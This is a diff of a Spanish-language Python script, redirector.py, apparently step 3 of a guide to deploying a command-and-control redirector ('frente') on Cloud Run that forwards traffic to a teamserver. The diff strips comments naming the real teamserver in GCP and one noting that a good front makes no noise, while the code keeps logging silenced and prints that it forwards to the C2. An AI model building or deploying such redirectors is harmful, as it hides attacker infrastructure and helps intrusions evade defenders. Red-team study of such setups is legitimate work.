@@ -1,6 +1,4 @@
 # redirector.py — Paso 3: el mismo frente del Paso 2, listo para Cloud Run.
-# ÚNICO cambio respecto al Paso 2: el C2 apunta a tu teamserver real en GCP.
-# Cloud Run inyecta PORT; el código ya lo lee. HTTPS y dominio *.run.app: gratis.
 import os, urllib.request
 from http.server import HTTPServer, BaseHTTPRequestHandler
 
@@ -18,7 +16,7 @@ class Frente(BaseHTTPRequestHandler):
         self.wfile.write(respuesta)
 
     def log_message(self, *args):
-        pass  # un buen frente no hace ruido
+        pass 
 
 print(f"Frente en :{PUERTO} → reenviando a {C2}")
 HTTPServer(("0.0.0.0", PUERTO), Frente).serve_forever()
